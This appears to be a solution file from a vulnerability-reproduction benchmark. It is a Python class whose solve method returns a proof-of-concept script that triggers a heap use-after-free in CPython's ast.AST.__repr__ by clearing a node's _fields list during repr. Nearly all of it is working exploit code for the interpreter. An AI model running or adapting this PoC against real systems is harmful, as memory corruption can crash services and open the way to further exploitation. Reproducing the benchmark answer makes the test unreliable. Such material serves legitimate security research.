import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: Heap Use After Free in ast.AST.__repr__ via _fields mutation.
        """
        # The vulnerability exists because AST repr iterates over the `_fields` list.
        # If the list is modified (cleared) during iteration (e.g. inside a field's __repr__),
        # the underlying C loop uses cached pointers/indices that become invalid (UAF).
        
        poc_source = (
            "import ast, gc\n"
            "class Trigger:\n"
            "    def __repr__(self):\n"
            "        # Clearing _fields triggers the UAF in the C loop iterating it\n"
            "        node._fields.clear()\n"
            "        gc.collect()\n"
            "        return 'Trigger'\n"
            "\n"
            "class VulnerableNode(ast.AST):\n"
            "    pass\n"
            "\n"
            "node = VulnerableNode()\n"
            "# Use generated strings to avoid interning and ensure heap allocation\n"
            "f1 = 'a' * 64\n"
            "f2 = 'b' * 64\n"
            "\n"
            "# _fields must be a list to be mutable\n"
            "node._fields = [f1, f2]\n"
            "\n"
            "# Set attributes. Accessing f1 calls Trigger.__repr__\n"
            "setattr(node, f1, Trigger())\n"
            "setattr(node, f2, 1)\n"
            "\n"
            "try:\n"
            "    repr(node)\n"
            "except Exception:\n"
            "    pass\n"
        )
        return poc_source.encode('utf-8')